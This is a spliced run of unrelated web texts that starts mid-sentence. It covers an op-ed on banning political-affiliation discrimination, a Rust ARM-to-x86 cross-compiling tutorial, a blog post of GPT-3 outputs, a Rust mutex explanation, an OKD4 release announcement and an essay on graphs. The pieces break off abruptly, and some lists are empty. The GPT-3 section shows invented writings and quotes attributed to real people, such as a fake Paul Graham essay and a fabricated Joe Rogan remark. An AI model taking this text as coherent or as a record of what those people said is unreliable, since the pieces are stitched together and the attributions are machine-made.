because they dislike their political views, such legislation would only go partway towards remedying the chilling effects on free speech. That’s why those of us who worry about cancel culture should also push for the inclusion of political affiliation in the rubric of anti-discrimination laws. </p><p> The Civil Rights Act has long prohibited employers from discriminating on the basis of race, color, religion, gender, pregnancy, or national origin. In June, the Supreme Court <a href="https://www.npr.org/2020/06/15/863498848/supreme-court-delivers-major-victory-to-lgbtq-employees">ruled that this provision</a> also protects gay, lesbian, and transgender employees. But there are no equivalent federal protections to prevent employees from being disadvantaged because of their political views.</p><div><p>This is a missed opportunity, as the success of local ordinances mandating such protections has shown. In Washington D.C., for example, the <a href="https://ohr.dc.gov/sites/default/files/dc/sites/ohr/publication/attachments/LawsAndRegs-HumanRightsAct-1977-English.pdf">Human Rights Act</a> prohibits employment discrimination based on political affiliation, defined as “the state of belonging to or endorsing any political party.” As Edgar Njatou, Executive Director of Workplace Fairness, told me in an interview, this ensures that your boss can’t fire you if they “find out you voted for Hillary or that you’re a Republican.”</p><p> Seattle has even more ambitious protections for workers’ political views. Its laws prohibit discrimination based on “<a href="https://library.municode.com/wa/seattle/codes/municipal_code?nodeId=TIT14HURI_CH14.06UNPUACPR&amp;showChanges=true">political ideology</a>,” which is defined as “any idea or belief … relating to the purpose, conduct, organization, function or basis of government institutions and activities, whether or not characteristic of any political party or group.” But even this law mostly serves to protect people with relatively common political views. After the 2016 election, for example, local rental listings began to discourage Trump supporters from applying. “If you are a landlord,” city government spokesperson Elliot Bronstein, <a href="https://www.king5.com/article/news/local/seattle/no-trump-clause-is-new-requirement-for-some-seattle-renters/416269805">wrote in response</a>, “you cannot discriminate on political status.” (Like other protections against discrimination, this does not apply to housemates, who share an apartment or living space.) </p></div><p>There are two obvious objections—both of which could easily be addressed. First, some organizations have a legitimate interest in ensuring that their employees share a broad worldview: It would make no sense, for example, to stop a political campaign group from discriminating against a job applicant who opposes the organization’s goals. Explicitly political organizations should therefore enjoy a carve-out from the stricture against discriminating on the basis of political beliefs (though they would still have to afford existing employees the due process protections guaranteed under “just cause” provisions). </p><p>Second, employers have a legitimate interest in protecting their staff from the hateful conduct of colleagues: Clearly, for example, no member of an ethnic minority should have to endure racist taunts at their place of work. But this could also be addressed through carefully worded legislation.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p>It’s 2020. The world is abuzz with, well – <em>waves hand</em> – all this. But it's
also abuzz with <a href="https://en.wikipedia.org/wiki/ARM_architecture">ARM</a>: Apple is moving their Mac line to Apple Silicon, Amazon
has been been touting their Gravaton2-based infrastructure, Cloudflare is said
to be going all ARM on their edge nodes, and the <a href="https://www.anandtech.com/show/15869/new-1-supercomputer-fujitsus-fugaku-and-a64fx-take-arm-to-the-top-with-415-petaflops">world's fastest supercomputer
is built on ARM</a>.</p>
<p>For a long time, I – and I think many others – held the idea that <a href="https://en.wikipedia.org/wiki/X86-64">x86-64</a> is
for heavy workloads and ARM is for the "little stuff" like embedded systems and
Raspberry Pis.</p>
<p>And that’s why you can find tons of articles online for how to cross-compile
Rust <em>from</em> x86-64 <em>to</em> ARM.</p>
<p>I want to cross-compile the other way.</p>
<p>At <a href="https://zenlist.com/">Zenlist</a>, we use Rust to run our entire fleet of lambdas (around 90 of
them).</p>
<p>Amazon has been talking up their beefy Gravaton2-based ARM instances. But right
now, <a href="https://aws.amazon.com/lambda/">lambda</a> – which feels to me like the "little stuff" because of their
low-memory/low-CPU settings – only runs on x86-64.</p>
<p>I decided we needed to figure out how to build our lambda runtimes from an ARM
server: I needed to cross-compile Rust <em>from</em> ARM <em>to</em> x86-64.</p>
<hr>
<p>So here we go.</p>
<h2>Getting started</h2>
<p>I launched two Ubuntu 20.04 instances: a <a href="https://aws.amazon.com/ec2/instance-types/c6/">c6g.medium</a> for the build
machine and a <a href="https://aws.amazon.com/ec2/instance-types/t3/">t3.micro</a> as an x86-64 to run the results on. (Cut me some
slack here! Including how to compile and run on lambda would make this article
quite a bit longer!)</p>
<p>Log into that build machine and lets get started. A quick visit to <a href="https://rustup.rs/">rustup.rs</a>
to install Rust, of course.</p>
<p>And a <code>apt-get install -y build-essential</code> for all of the other tools we need.</p>
<p>And finally,</p>
<pre><code>$ cargo new --bin crossed
$ cargo run
Hello, world!
</code></pre>
<p>gets a nice little greeting printed the to the screen. We're in business!</p>
<h2>Cross compile!</h2>
<p>Alright, so now we want to cross compile this admittedly awesome project to run
on the target machine.</p>
<p>We'll start in the usual place: adding a new target.</p>
<pre><code>rustup target add x86_64-unknown-linux-musl
</code></pre>
<p>On lambda, it's nice to use the <code>musl</code> target to get everything statically
linked together.</p>
<p>Alright, let's give it a try.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
error: linking with `cc` failed: exit code: 1
</code></pre>
<p>Well bummer. I was really hoping that would Just Work™. No need to panic yet,
because I remember from reading other articles like <a href="https://rendered-obsolete.github.io/2019/03/19/rust_lambda.html">Rust on
Lambda</a> and <a href="https://sigmaris.info/blog/2019/02/cross-compiling-rust-on-mac-os-for-an-arm-linux-router/">Cross compiling Rust on Mac OS for an ARM
Linux router</a> that we probably just need to configure a
cross-compiling linker.</p>
<p>Alright, so we need to install a cross compiler.</p>
<pre><code>sudo apt install gcc-x86-64-linux-gnu
</code></pre>
<p>Then we need to set it up by throwing this in <code>~/.cargo/config</code>.</p>
<pre><code>[target.x86_64-unknown-linux-musl]
linker = "x86_64-linux-gnu-gcc"
</code></pre>
<p>And now, <code>cargo build --release --target x86_64-unknown-linux-musl</code> works
great!</p>
<h2>And it works on the target machine, right?</h2>
<p>Well, I had better make sure. That's why I spun up the target machine, after
all.</p>
<pre><code>$ scp target/x86_64-unknown-linux-musl/release/crossed ubuntu@target-machine:.
$ ssh ubuntu@target-machine ./crossed
Hello, world!
</code></pre>
<p>🎉🏆</p>
<h2>The author counts his chickens before they hatch</h2>
<p>So that's how to cross-compile for x86-64 lambda from an ARM machine! Publish
this post. <a href="https://developers.google.com/search/docs/guides/submit-URLs">Submit the sitemap to Google</a>. Actually, hey, we can
probably do that right from this project!</p>
<p>I'll just add <a href="https://docs.rs/reqwest">reqwest</a> to the <code>Cargo.toml</code>.</p>
<pre><code>[dependencies]
reqwest = { version = "0.10", default-features = false, features = ["rustls-tls", "blocking"] }
</code></pre>
<p>And write up some quick code to notify Google that my sitemap has changed, and
it should index this clearly-complete-and-not-missing-anything article.</p>
<pre><code>fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    let client = reqwest::blocking::Client::default();
    let url = "http://www.google.com/ping?sitemap=https://burgers.io/sitemap.xml";
    let status = client.get(url)
        .send()?
        .status();

    println!("{:?}", status);

    Ok(())
}
</code></pre>
<p>And cross-compile it while I get a celebratory drink.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
error: failed to run custom build command for `ring v0.16.15`
</code></pre>
<h2>Wait, what?</h2>
<p>Everything was sailing along so smoothly! What happened?</p>
<p>Not-rust happened.</p>
<p>I told <em>Cargo</em> about my cross-compiler. But <a href="https://docs.rs/ring">ring</a> – a crypto library that
reqwest uses – uses some code that isn't Rust, and it had no way to know about
my cross compiler.</p>
<p>Let's take a longer look at more of the error log.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
error: failed to run custom build command for `ring v0.16.15`

Caused by:
  process didn't exit successfully: `/home/ubuntu/crossed/target/release/build/ring-082dc03a36bb5ba5/build-script-build` (exit code: 101)
--- stdout
OPT_LEVEL = Some("3")
TARGET = Some("x86_64-unknown-linux-musl")
HOST = Some("aarch64-unknown-linux-gnu")
CC_x86_64-unknown-linux-musl = None
CC_x86_64_unknown_linux_musl = None
TARGET_CC = None
CC = None
CROSS_COMPILE = None
CFLAGS_x86_64-unknown-linux-musl = None
CFLAGS_x86_64_unknown_linux_musl = None
TARGET_CFLAGS = None
CFLAGS = None
CRATE_CC_NO_DEFAULTS = None
DEBUG = Some("false")
CARGO_CFG_TARGET_FEATURE = Some("fxsr,sse,sse2")
</code></pre>
<p>Yep, yep, looks good, target is <code>x86_64-unknown-linux-musl</code>, host is
<code>aarch64-unknown-linux-gnu</code>, uh huh, yep, <strong>oh</strong>.</p>
<p>That's interesting.</p>
<p>There's an environment variable there – <code>CC_x86_64_unknown_linux_musl</code> – that
looks like it's expecting the exact cross-compiler to use. And it's empty.</p>
<p>Well, let's change that! Using the exact same cross-compiler that we specified
in the cargo config, let's set that environment variable.</p>
<pre><code>$ export CC_x86_64_unknown_linux_musl=x86_64-linux-gnu-gcc
</code></pre>
<p>And then 🤞.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
</code></pre>
<p>It worked! Throw it over to the target machine and give it a try!</p>
<pre><code>$ scp target/x86_64-unknown-linux-musl/release/crossed ubuntu@target-machine:.
$ ssh ubuntu@target-machine ./crossed
200
</code></pre>
<p>Nice.</p>
<h2>Some final notes</h2>
<p>As bullet points? Why not.</p>
<ul>
<li>Make sure <code>CC_x86_64_unknown_linux_musl</code> is permanently in your environment
somehow. For us, this involved adding it to the environment section for
self-hosted GitHub runners.</li>
<li>In my specific testing for our specific projects, compilation times were up
to about 10% slower than on a corresponding <a href="https://aws.amazon.com/ec2/instance-types/c5/">c5</a> instance. But the cost
tradeoff was worth it.</li>
<li>I'm holding out hope that AWS will give us ARM-based lambdas in the future.</li>
<li>No instances were harmed while writing this article. Well, except the ones I
terminated. Which reminds me to remind you: if you were following along at
home, now might be a good time to terminate your instances.</li>
</ul>

<p>I got access the the <a href="https://openai.com/blog/openai-api/">OpenAI GPT-3 API</a> and I have to say I’m blown away. It’s far more coherent than any AI language system I’ve ever tried. All you have to do is write a prompt and it’ll add text it thinks would plausibly follow. I’ve gotten it to write songs, stories, press releases, guitar tabs, interviews, essays, technical manuals. It’s hilarious and frightening. I feel like I’ve seen the future and that full AGI might not be too far away.</p>



<p>In each case below bold is the prompt I provided GPT-3, and the rest is all generated by the AI. In some cases I had to click generate a few times, and in about 2/3 of the examples I picked the best example after a few tries, but I generally didn’t have work too hard to get it to write amazingly coherent text given a simple prompts. Here are some of my favorites. </p>

<p><strong>Below is a screenplay for a film-noir hard boiled detective story by Raymond Chandler about the boy wizard Harry Potter:</strong></p>



<p><strong>“Harry Potter”</strong><br><strong>By Raymond Chandler</strong></p>



<p>Harry Potter, Private Eye.<br>Scene: A small dingy office, early morning, furniture of the Salvation Army store variety. Sordid atmosphere. Harry Potter, in ratty tweed suit, unpressed shirt, and unshined shoes, sits behind the desk looking haggard, rumpled, and embittered. In one corner of the office a torn shade rattles at the wind gusts outside. Harry has one long index finger on the butt of a .38 and he broods over a photograph. The photograph shows a gorgeous blonde wearing an evening gown. She is holding a cocktail in one hand and looking pensively at a cigarette in the other. A tear adorns her cheek. Harry looks at her for a long moment, sighs, then puts his gun down and stands. He straightens his clothes, scratches his head, then with more resolution turns around, picks up his pistol, and leaves the office. He passes through the front room and looks out the dirty window. An old woman is washing the sidewalk outside with a mop. A young man in a double breasted gray suit is leaning against the building. Harry sighs again and goes out the door. He walks up to the young man and without ceremony punches him in the jaw.</p>



<p><strong>Press Release: Anaheim, CA: President Kanye West declares Disney Land to be the new capital of the United States. Washington D.C. will be maintained as a museum.</strong><br>The move has been in the works since the mid-2000’s. <br>Advertisement <br>*2. Removes his sunglasses, revealing that he is no longer in any way blinded. <br>*3. Endorsed by Senator Kid Rock, who has also declared this new government of Disneyland will be paying for his divorce.<br>*4. An elaborate surgery will take place to repair Kanye’s “Diamond Tiara” tattoo, and reposition it to his forehead so that he can legally be recognized as a Princess. <br>Advertisement <br>*5. Joe Rogan has been picked to be the new Drug Czar. <br>“It’s long been established I’ve been Kanye’s gateway drug, so why not put me in a position of power,” Rogan said, clearly relishing his new position. “I have an in-depth understanding of the ways in which recreational drug use enhances one’s experience of life. I am deeply passionate about getting drugs to kids.” <br>*6. Kardashian sisters will no longer be known as The Kardashians. The family will change its name to The Wests. <br>*7. Kanye West’s new sports bra will no longer be known as a sports bra. It will be officially recognized as The West Bandit. <br>Advertisement <br>*8. President Kanye will announce that he has a new national anthem. The government-mandated anthem will be a modified version of Kanye’s 2007 hit “Stronger.” It will be played on a continuous loop at all times.</p>

<p><strong>Blood Song</strong><br><strong>By HP Lovecraft</strong></p>



<p><strong>The creeping chaos Nyarlathotep walks upon the earth while in his House at R’lyeh dead Cthulhu waits dreaming. After eight seaons on&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://paper.dropbox.com/?q=%23TeamDaenerys">#TeamDaenerys</a>&nbsp;&nbsp;Nyarlathotep is quite irritated with what he feels is a very hackneyed ending to Game of Thrones.</strong></p>



<p>On the third day of season eight, Nyarlathotep looks down upon his television and utters&nbsp;“What&nbsp;the hell are they doing?”At this point, Nyarlathotep goes on a long tirade about how the Starks were supposed to be there at the end. Instead we have Daenerys looking like she is going to set everything on fire. He tells his cult of followers that Daenerys’ actions are completely nonsensical and that it is completely disrespectful to not finish a story with all its main characters alive. He mentions that they should just burn down Winterfell because it makes no sense for her to even be there. It would make more sense if she flew in with Drogon and just burned King’s Landing. His followers start to get nervous when Nyarlathotep mentions he has always liked Cersei.</p>



<p><strong>Below is a pop song by Taylor Swift about the boy Wizard Harry Potter. </strong></p>

<p>‘Cause he’s got that Potter hair </p>



<p>Even when he’s super stressed <br>He’s still got those supersonic cheekbones <br>I’m not surprised they made a movie </p>



<p>‘Cause I’d watch him anytime <br>Oh, yeah, Harry, baby, you’re my favorite character </p>

<p><strong>The following is an essay by Paul Graham on paulgraham.com on how to make Mars a startup hub</strong>.</p>



<p><strong>Startups On Mar</strong>s<br><strong>By Paul Graham</strong></p>



<p>Here’s the sort of startup that might make a go of it on Mars:<br>One that makes money by taking advantage of local resources. For example, a startup that uses the Martian atmosphere to make fertilizer or methane fuel. A startup that sells water from Martian rivers. A startup that uses minerals from the Martian soil. A startup that uses solar power from the Martian sun. A startup that uses a new kind of solar panel that’s more efficient at converting sunlight into electricity.<br>I would even invest in a startup that did nothing but extract the helium-3 from the Martian atmosphere and send it back to Earth.<br>If you can find a way to make money by using local resources, there’s probably a business there.<br>There’s another class of startups that might work on Mars:<br>Startups that produce services for other startups. For example, a startup that makes it easier to build rockets, or to extract gases from the Martian atmosphere, or to construct solar panels, or to farm the local soil.<br>Startups that make things more comfortable for colonists. For example, a startup that sells air conditioners, or houses. A startup that sells things to keep colonists entertained. A startup that provides Internet services.</p>



<p><strong>The following is a blog post from Slate Star Codex about the value of free speech and civility in a democratic society.</strong></p>



<p><strong>Do Not Go Gentle Into That Good Night</strong><br><strong>By Scott Alexander</strong></p>



<p>I.<br>There’s a concept that comes up often in debates about free speech called&nbsp;“shouting&nbsp;fire in a crowded theater”. The basic idea is that you can’t just say whatever you want whenever you want – especially if it’s likely to cause panic. And the reason for this is obvious: panic leads to violence, and violence hurts people. If you are causing panic, then your right to free speech ends where the other person’s right to not get hurt begins.<br>But this isn’t really true. If shouting fire in a crowded theater were illegal, then there wouldn’t be any actual fires in theaters, would there? How could there be? If everyone knew that shouting fire …</p></div></div>

</div>
<p>This program creates an integer counter protected by a mutex, spawns 10 threads, increments the counter 10 times from each thread, and prints the total.</p>
<p>The <code>counter</code> variable lives on the stack, and  a pointer to these stack data is shared with other threads.
The threads have to lock the mutex to do the increments.
When printing the total, the counter is read bypassing the mutex, without any synchronization.</p>
<p>The beauty of this program is that it relies on several bits of subtle reasoning for correctness, each of which is checked by compiler:</p>
<div>
<ol>
<li>
<p>Child threads don’t escape the <code>main</code> function and so can read <code>counter</code> from its stack.</p>
</li>
<li>
<p>Child threads only access <code>counter</code> through the mutex.</p>
</li>
<li>
<p>Child threads will have terminated by the time we read <code>total</code> out of <code>counter</code> without mutex.</p>
</li>
</ol>
</div>
<p>If any of these constraints is broken, the compiler rejects the code.
There’s no need for <code>std::shared_ptr</code> just to defensively make sure that the memory isn’t freed under your feet.</p>
<p>Rust allows doing dangerous, clever, and fast things without fear of introducing undefined behavior.</p>
<p>If you like what you see, here are two books I recommend for diving deeper into Rust:</p>

<h2>Announcing the General Availability of OKD4</h2>
<p>Today, the OKD-WG is pleased to announce the General Availability of OKD4, the community distribution of Red Hat OpenShift Kubernetes platform. With today’s GA release of OKD4, Red Hat continues its commitment to open source and open collaboration with the Kubernetes and other Cloud Native communities.</p>
<p><img src="https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=600&amp;name=OKD4%20is%20now%20Generally%20Available-1.png" alt="" width="600" srcset="https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=300&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 300w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=600&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 600w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=900&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 900w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=1200&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 1200w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=1500&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 1500w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=1800&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<h2>OKD’s Origins</h2>
<p>In April 2012, Red Hat first released Origin as the open source upstream project of OpenShift. We had little inkling of the phenomenal trajectory of cloud-native technology that was to come. From the rise of containers, the birth of OCI and Fedora CoreOS, and now the <a href="https://www.openshift.com/blog/operator-framework-moves-to-cncf-for-incubation" rel=" noopener">CNCF’s incubation of Operator Framework</a>, it has been an amazing ride. OKD4 wouldn’t be possible without all these incredible innovative technologies and their communities.</p>
<p>During the 3.x release timeframe, OKD has been a stable basis for OpenShift Container Platform, acting as an upstream distribution based on community-driven components - CentOS and Project Atomic to name a few. With the advent of the <a href="https://www.redhat.com/en/blog/introducing-red-hat-universal-base-image">Universal Base Image,</a> relations between OKD and OCP has changed - from "upstream-downstream" to what we call "sibling distributions." Images are built using RHEL7 base and can be distributed simultaneously for OKD and OCP, with no rebuild necessary. This enables both distributions to get updated code earlier, including security fixes from RHEL7, and provides a stable base for Red Hat Enterprise Linux.</p>
<p>OpenShift 4.x heavily focuses on high availability, observability and seamless upgrades. With the OKD 4 release, the community is not only getting easy access to these features, but also the ability to affect the direction of the platform (via <a href="https://github.com/openshift/enhancements/">enhancements process</a>) and a community space for experimentation, discussion and knowledge sharing. The Operators pattern used throughout the design of OKD 4 is allowing users to maintain clusters efficiently over their lifetime.</p>
<h2>Release Highlights</h2>
<p>OKD4 uses <a href="https://youtu.be/JepNm7R0LSo">Fedora CoreOS</a> as a base OS for the nodes. It enables the cluster with recent security fixes, new features (like cgroups v2 support) and updated software. OKD4 is using the same images as the corresponding OpenShift Container Platform release. As a result, the community can participate in the development and can modify any part of the cluster in order to achieve specific goals.</p>
<p>The cluster still has the same features as in OKD3 - it can be installed in the user environment, configured to user liking and updated.</p>
<hr>
<h2>How it differs from OCP</h2>
<p>Unlike OCP there are several distinctive features in OKD4:</p>
<p>As a community distribution it does not require a pull secret from <a href="https://openshift.com/try">https://openshift.com/try</a>. All OKD4 images are available without additional authentication. The base OS image for OKD4 is available at <a href="https://getfedora.org/en/coreos/download/">https://getfedora.org/en/coreos/download/</a>. However some optional operators from <a href="https://operatorhub.io/" rel=" noopener">operatorhub.io</a> require a pull secret, so by default OKD4 installs a source with community operators only. See <a href="https://github.com/openshift/okd/blob/master/FAQ.md#how-can-i-enable-the-non-community-red-hat-operators">FAQ</a> for more information.</p>
<p>OCP is an opinionated Kubernetes distribution with a heavy focus on high availability and production workloads. This puts restrictions on cluster configuration - for instance, single master installations are not supported. OKD4, however, allows users to install single master clusters - for development or stage environments. These clusters cannot be upgraded to later versions, though.</p>
<p>OKD4 creates a new nightly release after OCP tests are completed by our CI system. Every two weeks we'll promote a nightly to a stable release stream, so users can get updates to latest and tested code without switching channels.</p>
<hr>
<h2>Getting Started</h2>
<p>Installing OKD4 is as easy as OCP4 - see <a href="https://github.com/openshift/okd#getting-started">Getting Started</a> for instructions.</p>

  <p><span>30 Jun 2020</span></p><p>Research has begun to reveal many algorithms can be expressed as matrix multiplication, suggesting an unrealized connection between linear algebra and computer science. I speculate graphs are the missing piece of the puzzle. Graphs are not only useful as cognitive aides, but are suitable data structures for a wide variety of tasks, particularly on modern parallel processing hardware.</p>

<p>In this essay, I explore the virtues of graphs, algebra, types, and show how these concepts can help us reason about programs. I propose a computational primitive based on graph signal processing, linking software engineering, graphs, and linear algebra. Finally, I share my predictions for the path ahead, which I consider to be the start of an exciting new chapter in computing history.</p>

<p><em>n.b.: None of these ideas are mine alone. Shoulders of giants. Follow the links and use landscape mode for optimal reading experience.</em></p>



<p>Over the last decade, I bet on some strange ideas. A lot of people I looked up to at the time laughed at me. I’ll bet they aren’t laughing anymore. I ought to thank them one day, because their laughter gave me a lot of motivation. I’ve said some idiotic things to be sure, but I’ve also made some laughable predictions that were correct. Lesson learned: aim straighter.</p>

<p>In 2012, I was in Austin sitting next to an ex-poker player named <a href="https://twitter.com/amirpc">Amir</a> who was singing Hinton’s praises. Hypnotized by his technicolor slides, I quit my job in a hurry and started an educational project using speech recognition and restricted Boltzmann machines. It never panned out, but I learned a lot about ASR and Android audio. Still love <a href="http://breandan.net/2014/02/09/the-end-of-illiteracy/">that idea</a>.</p>

<p>In 2017, I started writing a book on the ethics of automation and <a href="http://breandan.net/2017/02/02/trust-in-automation/">predicted</a> mass unemployment and social unrest. Although I got the causes wrong (pandemic, go figure), the information economy and confirmation bias takes were all dead right. Sadly, this is now driving the world completely insane. Don’t say I warned you, go out and fix our broken systems. The world needs more engineers who care.</p>

</center>

<p>In 2017, I witnessed the birth of <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>, which I stole from Chris Olah and turned into a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">master’s thesis</a>. Had a lot of trouble convincing people that classical programs could be made differentiable, but look at the proceedings of any machine learning conference today and you’ll find dozens of papers on differentiable sorting and rendering and simulation. Don’t thank me, thank Chris and the Theano guys.</p>

<p>In 2018, I correctly predicted Microsoft would acquire GitHub to mine code. Why MS and not Google? I’ll bet they tried, but Google’s leadership had fantasies of AGI and besides JetBrains, MS were the only ones who gave a damn about developers. Now ML4SE is a thriving <a href="https://ml4se.github.io/">research area</a> and showing up in <a href="https://github.com/JetBrains-Research/DeepBugsPlugin">real</a> <a href="https://devblogs.microsoft.com/visualstudio/ai-assisted-intellisense-for-your-teams-codebase/">products</a>, much to the chagrin of those who believed ML was a fad. I suspect their hype filter blinded them to the value those tools provide.</p>

<center>
<blockquote><p lang="en" dir="ltr">Prediction: MS will acquire GH within five years. If the <a href="https://twitter.com/hashtag/ML4Code?src=hash&amp;ref_src=twsrc%5Etfw">#ML4Code</a> stuff delivers for MS, acquisition is highly likely. Although it would have been cheaper a few years ago. <a href="https://t.co/5ZMtiRtifD">https://t.co/5ZMtiRtifD</a> <a href="https://t.co/TaxkArm5ps">https://t.co/TaxkArm5ps</a></p>— breandan (@breandan) <a href="https://twitter.com/breandan/status/993553301927936001?ref_src=twsrc%5Etfw">May 7, 2018</a></blockquote>

<img width="75%" src="http://breandan.net/images/microsoft_github_aquisition.png"></a>
</center>

<p>But to heck with everything I’ve said! If I had just one idea to share with these ML people, it would be types. Beat that drum as loud as I could. Types are the best tool we know for synthetic reasoning. If you want to build provably correct systems that scale on real-world applications, use types. Not everyone is convinced yet, but mark my words, <a href="https://github.com/tensorflow/tensorflow/issues/12345">types</a> are <a href="https://docs.python.org/3.9/whatsnew/3.9.html#pep-585-builtin-generic-types">coming</a>. Whoever figures out how to connect types and learning will be the next Barbara Liskov or Frances Allen.</p>

<p>This year, I predicted the pandemic weeks before the lockdown, exited the market, and turned down a job at Google. Some people called me crazy. Now I’m going all-in on some new ideas (none of which are mine). I’m making some big bets and some will be wrong, but I see the very same spark of genius in them.</p>



<p>As a kid, I was given a book on the history of mathematics. I remember it had some interesting puzzles, including one with <a href="https://en.wikipedia.org/wiki/Seven_Bridges_of_K%C3%B6nigsberg">some bridges</a> in a town divided by rivers, once inhabited by a man called Euler. Was there a tour crossing each bridge exactly once? Was it possible to tell without checking every path? I remember spending days trying to figure out the answer.</p>

<p>In the late 90s, my mom and I went to Ireland. I remember visiting Trinity College, and learning about a mathematician called <a href="https://en.wikipedia.org/wiki/William_Rowan_Hamilton">Hamilton</a> who discovered a famous formula connecting algebra and geometry, and carved it onto a <a href="https://en.wikipedia.org/wiki/Broom_Bridge">bridge</a>. We later visited the bridge, and the tour guide pointed out the stone, which we touched for good luck. The Irish have a <a href="https://en.wikipedia.org/wiki/Poulnabrone_dolmen">thing</a> for <a href="https://en.wikipedia.org/wiki/Newgrange">stones</a>.</p>

<p>In 2007, I was applying to college and took the train from Boston to South Bend, Indiana, home of the Fighting Irish. Wandering about, I picked up a magazine article by a Hungarian mathematician called <a href="https://en.wikipedia.org/wiki/Albert-L%C3%A1szl%C3%B3_Barab%C3%A1si">Barabási</a> then at Notre Dame, who had some interesting things to say about <a href="https://en.wikipedia.org/wiki/Complex_network">complex networks</a>. Later in 2009, while studying in Rochester, I <a href="http://breandan.net/images/complex_network_seminar.png">carpooled</a> with a <a href="https://avesis.medeniyet.edu.tr/hasan.guclu">nice professor</a>, and learned complex networks are found in brains, languages and many marvelous places.</p>

<p>Fast forward to 2017. I was lured by the siren song of algorithmic differentiation. Olivier Breleux presented <a href="https://github.com/mila-iqia/myia">Myia</a> and <a href="https://github.com/breuleux/buche">Buche</a>. Matt Johnson gave a talk on <a href="https://github.com/HIPS/autograd">Autograd</a>. I met Chris Olah in Long Beach, who gave me the idea to study <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>. I stole his idea, dressed it up in Kotlin and traded it for a POPL workshop paper and later a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">Master’s thesis</a>. Our contributions were using algebra, shape inference and presenting AD as term rewriting.</p>

<p>In 2019, I joined a lab with a <a href="https://www.cs.mcgill.ca/~jguo/">nice professor</a> at McGill applying knowledge graphs to software engineering. Like logical reasoning, knowledge graphs are an idea from the first wave of AI in the 1960s and 70s which have been revived and studied in light of recent progress in the field. I believe this is an important area of research with a lot of potential. Knowledge and traceability plays a big role in software engineering, and it’s the bread-and-butter of a good IDE. The world needs better IDEs if we’re ever going to untangle this mess we’re in.</p>

<p>This Spring, I took a fascinating seminar on <a href="https://cs.mcgill.ca/~wlh/comp766/index.html">Graph Representation Learning</a>. A lot of delightful graph theory has been worked out over the last decade. <a href="https://en.wikipedia.org/wiki/PageRank">PageRank</a> turned into power iteration. People have discovered many interesting connections to linear algebra, including Weisfeiler-Lehman graph kernels, graph Laplacians, Krylov methods, and spectral graph theory. These ideas have deepened our understanding of graph signal processing and its applications for learning and program analysis. More on that <a href="#graphs-computationally">later</a>.</p>



<p>Graphs are general-purpose data structures used to represent a variety of data types and procedural phenomena. Unlike most sequential languages, graphs are capable of expressing a much richer family of relations between entities, and are a natural fit for many problems in computer science, physics, biology and mathematics. Consider the following hierarchy of data structures, all of which are graphs with increasing expressive power:</p>

<ul>
  <li><strong>Sets</strong>: datasets, multisets, posets, alphabets</li>
  <li><strong>Sequences</strong>: Lists, strings, arrays, linear function composition</li>
  <li><strong>Trees</strong>: <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract syntax</a>, <a href="https://en.wikipedia.org/wiki/Document_Object_Model">XML</a>, <a href="https://en.wikipedia.org/wiki/Phylogenetic_tree">phylogeny</a>, <a href="https://en.wikipedia.org/wiki/Decision_tree">decision trees</a></li>
  <li><strong>DAGs</strong>: <a href="https://eagain.net/articles/git-for-computer-scientists/">Git</a>, <a href="https://en.wikipedia.org/wiki/Citation_network">citations</a>, <a href="https://en.wikipedia.org/wiki/Dependency_graph">dependency graphs</a>, <a href="https://en.wikipedia.org/wiki/Workflow_management_system">workflows</a>, <a href="https://en.wikipedia.org/wiki/Control-flow_graph">control flow</a>, <a href="https://en.wikipedia.org/wiki/Multilayer_perceptron">MLPs</a></li>

</ul>

<p>As we realized in <a href="https://github.com/breandan/kotlingrad">Kotlin∇</a>, directed graphs can be used to model mathematical expressions, as well as other formal languages, including source code, intermediate representations and binary artifacts. Not only can graphs be used to describe extant human knowledge, many recent examples have shown that machines can “grow” trees and graphs for various applications, such as program synthesis, mathematical deduction and physical simulation. Recent neuro-symbolic applications have shown promising early results in graph synthesis:</p>

</ul>

<p>The field of natural language processing has also developed a rich set of graph-based representations, such as <a href="https://en.wikipedia.org/wiki/Phrase_structure_grammar">constituency</a>, <a href="https://en.wikipedia.org/wiki/Dependency_grammar">dependency</a>, <a href="https://en.wikipedia.org/wiki/Link_grammar">link</a> and other and other typed attribute grammars which can be used to reason about syntactic and semantic relations between natural language entities. Research has begun to show many practical applications for such grammars in the extraction and organization of human knowledge stored in large text corpora. Those graphs can be further processed into ontologies for logical reasoning.</p>

<p>Using coreference resolution and entity alignment techniques, we can reconstruct internally consistent relations between entities, which capture cross-corpus consensus in natural language datasets. When stored in <a href="https://arxiv.org/pdf/2003.02320.pdf">knowledge graphs</a>, these relations can be used for information retrieval and question answering, e.g. on wikis and other content management systems. Recent techniques have shown promise in automatic knowledge base construction (cf. <a href="https://www.mitpressjournals.org/doi/pdf/10.1162/tacl_a_00088">Reddy et al.</a>, 2016).</p>

